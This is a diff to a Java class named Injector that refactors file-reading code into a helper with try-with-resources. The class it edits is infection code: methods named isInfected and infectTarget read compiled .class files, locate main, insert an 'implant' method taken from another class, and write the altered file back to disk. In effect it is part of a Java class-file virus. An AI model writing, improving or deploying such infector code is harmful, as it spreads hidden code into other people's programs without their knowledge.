@@ -127,8 +127,7 @@ public class Injector {
             throw new ClassNotFoundException(sourcePath.toString());
         }
 
-        DataInputStream inputStream = new DataInputStream(new FileInputStream(sourcePath.toFile()));
-        return new ClassFile(inputStream);
+        return readClassFile(sourcePath);
     }
 
     private static ClassFile findAndReadClassFileFromJar(final Class<?> clazz, final Path jarFilePath) throws ClassNotFoundException, IOException {
@@ -147,9 +146,9 @@ public class Injector {
     }
 
     private static MethodInfo readImplant(final Path classFilePath, final String sourceMethodName) throws IOException {
-        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
-
-        return readImplant(new DataInputStream(in), sourceMethodName);
+        try (DataInputStream in = new DataInputStream(new BufferedInputStream(new FileInputStream(classFilePath.toFile())))) {
+            return readImplant(in, sourceMethodName);
+        }
     }
 
     private static MethodInfo readImplant(final DataInputStream classFileInputStream, final String sourceMethodName) throws IOException {
@@ -167,17 +166,13 @@ public class Injector {
     }
 
     public static boolean isInfected(final Path classFilePath, final MethodInfo implant) throws IOException {
-        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
-        ClassFile cf = new ClassFile(new DataInputStream(in));
-        in.close();
+        final ClassFile cf = readClassFile(classFilePath);
 
         return cf.getMethod(implant.getName()) != null;
     }
 
     public static boolean infectTarget(final Path classFilePath, final MethodInfo implantMethod) throws IOException {
-        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
-        ClassFile cf = new ClassFile(new DataInputStream(in));
-        in.close();
+        final ClassFile cf = readClassFile(classFilePath);
 
         MethodInfo main = cf.getMethod("main");
         if (main == null) {
@@ -227,5 +222,13 @@ public class Injector {
         cf.write(new DataOutputStream(new FileOutputStream(classFilePath.toFile())));
 
         return true;
+    }
+
+    private static ClassFile readClassFile(Path classFilePath) throws IOException {
+        final ClassFile cf;
+        try (DataInputStream in = new DataInputStream(new BufferedInputStream(new FileInputStream(classFilePath.toFile())))) {
+            cf = new ClassFile(in);
+        }
+        return cf;
     }
 }
